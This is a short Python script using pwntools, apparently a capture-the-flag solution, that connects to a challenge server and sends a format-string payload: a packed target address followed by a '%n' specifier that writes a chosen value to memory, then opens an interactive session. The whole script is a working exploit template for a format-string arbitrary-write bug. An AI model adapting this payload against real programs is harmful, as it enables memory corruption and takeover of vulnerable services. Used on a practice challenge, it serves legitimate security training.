# Python 3
from pwn import *

# Establish a connection to the challenge
conn = remote('all.chal.cyberjousting.com', 1348)

# The address you want to overwrite
address = p64(0x401199)

# The value you want to write
value = 0x100

# The payload
payload = address + ('%{}c%8$n'.format(value)).encode()

# Send the payload
conn.sendline(payload)

conn.interactive()
